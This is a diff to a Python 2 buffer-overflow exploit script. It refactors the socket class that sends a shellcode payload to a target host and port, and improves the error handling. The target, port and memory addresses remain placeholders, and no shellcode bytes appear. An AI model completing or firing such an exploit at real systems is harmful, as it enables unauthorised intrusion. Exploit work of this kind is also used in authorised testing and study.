@@ -17,13 +17,15 @@ def p(x):
 
 class Connect(object):
 
+    def __init__(self, host, port):
+        self.host = host
+        self.port = port
+
     def connect(self):
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         print('connecting to host')
-        sock.connect(('<Enter your target here', 'enter port#'))
+        sock.connect((self.host, self.port))
         return sock
-
-
 
     def send(self, command):
         sock = self.connect()
@@ -49,6 +51,7 @@ class Connect(object):
             if data == "": break
             data = sock.recv(1040)
             print data
+        sock.close()
         return recv_data
 
 # memory addresses for BoF payload
@@ -87,11 +90,9 @@ shellcode+= p(0x00000)
 shellcode+= payload
 
 try:
-    connect = Connect()
+    connect = Connect('<Enter your target here>', 'enter port#')
     connect.send(shellcode)
-except Exception:
-    print "Fault"
-
-time.sleep(5)
+except Exception as e:
+    print "An error occurred:", e
 
 # EOF
